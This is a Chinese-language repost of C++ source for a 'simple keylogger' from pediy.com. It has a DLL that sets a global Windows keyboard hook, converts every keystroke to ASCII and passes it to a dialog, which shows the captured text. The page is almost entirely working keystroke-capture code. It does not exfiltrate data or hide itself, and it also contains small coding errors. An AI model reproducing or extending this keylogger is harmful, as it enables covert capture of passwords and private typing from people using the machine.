
# 简单键盘记录器(C++源码)

> 原文：[`www.pediy.com/kssd/pediy11/125487.html`](https://www.pediy.com/kssd/pediy11/125487.html)

## `keyboardhook.h` 源码

```cpp
#ifndef __cplusplus

#define EXPORT extern "C" _declspec(dllexport)

#else

#define EXPORT _declspec(dllexport)

#endif

EXPORT LRESULT CALLBACK HookProc(int dwCode, WPARAM wParam, LPARAM lParam);

EXPORT void CALLBACK InstallHook(HWND hWnd, DWORD dwMsg);

EXPORT void CALLBACK UninstallHook();
```

## `keyboardhookdll.cpp` 源码

```cpp
#include<windows.h>

#include"keyboardhook.h"

#pragma comment(linker, "/section:keyboardhook, rws") // 设置共享数据段属性

#pragma data_seg("keyboardhook") // 共享数据段名

HWND hWnd = 0;

HHOOK hHook = 0;

DWORD dwMsg = 0;

char szAscii[4] = {0};

#pragma data_seg()

HINSTANCE hInstance;

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL, // handle to the DLL module
    DWORD fdwReason,    // reason for calling function
    LPVOID lpvReserved  // reserved
)
{
    hInstance = hinstDLL;
    return true;
}

EXPORT LRESULT CALLBACK HookProc(int dwCode, WPARAM wParam, LPARAM lParam)
{
    unsigned char szKeyState[256];
    CallNextHookEx(hHook, dwCode, wParam, lParam);
    GetKeyboardState(szKeyState);
    DWORD dwShift = GetKeyState(VK_SHIFT);
    szKeyState[VK_SHIFT] = (BYTE)LOWORD(dwShift);
    int nChar = ToAscii(wParam, HIWORD(lParam), (PBYTE)szKeyState, (PWORD)szAscii, 0);
    szAscii[nChar] = 0;
    SendMessage(hWnd, dwMsg, (UINT)szAscii, NULL);
    return 0;
}

EXPORT void CALLBACK InstallHook(HWND _hWnd, DWORD _dwMsg)
{
    hWnd = _hWnd;
    dwMsg = _dwMsg;
    hHook = SetWindowsHookEx(WH_KEYBOARD, HookProc, hInstance, NULL);
    return;
}

EXPORT void CALLBACK UninstallHook()
{
    UnhookWindowsHookEx(hHook);
    return;
}
```

## `keyboardRecord` 主程序源码

```cpp
#include<windows.h>

#include"resource.h"

#include"keyboardhook.h"

#define WM_HOOK WM_USER + 0x0100

#pragma comment(lib, "KeyboardHookDll.lib")

int CALLBACK DialogProc(
    HWND hwndDlg,  // handle to dialog box
    UINT uMsg,     // message
    WPARAM wParam, // first message parameter
    LPARAM lParam  // second message parameter
);

int WINAPI WinMain(HINSTANCE hPrevInstance, HINSTANCE hInstance, LPSTR lpCmdLine, int nCmdShow)
{
    DialogBoxParam(hInstance, MAKEINTRESOURCE(DLG_MAIN), NULL, DialogProc, NULL);
    ExitProcess(NULL);
    return 0;
}

WPARAM test;

int CALLBACK DialogProc(
    HWND hwndDlg,  // handle to dialog box
    UINT uMsg,     // message
    WPARAM wParam, // first message parameter
    LPARAM lParam  // second message parameter
)
{
    switch(uMsg)
    {
    case WM_CLOSE:
        UninstallHook();
        EndDialog(hwndDlg, NULL);
        break;
    case WM_INITDIALOG:
        InstallHook(hwndDlg, WM_HOOK);
        break;
    case WM_HOOK:
        SendDlgItemMessage(hwndDlg, IDC_EDITMAIN, EM_REPLACESEL, NULL, wParam);
        break;
    }
    return 0;
}
```
